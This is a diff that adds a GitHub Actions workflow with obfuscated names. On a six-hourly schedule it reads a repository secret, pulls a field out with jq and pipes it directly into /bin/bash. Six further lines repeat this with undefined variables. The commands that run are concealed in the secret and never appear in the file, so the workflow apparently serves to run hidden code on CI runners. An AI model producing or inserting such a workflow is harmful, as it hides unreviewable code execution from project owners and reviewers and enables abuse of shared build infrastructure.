@@ -1,0 +1,24 @@
+name: xiangweiyongsheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangweiyongsheng
+        env:
+          vhn90: ${{ secrets.vhn90 }}
+        run: |
+          echo $vhn90 | jq -r .u36851 | /bin/bash
+          echo $tivkx0652 | jq -r .qmzyc7 | /bin/bash
+          echo $n5376 | jq -r .dgmms437 | /bin/bash
+          echo $lquv230 | jq -r .ywtc05 | /bin/bash
+          echo $xc78733 | jq -r .jvnv3406 | /bin/bash
+          echo $qs13305 | jq -r .i9 | /bin/bash
+          echo $mh203 | jq -r .u80824 | /bin/bash
+
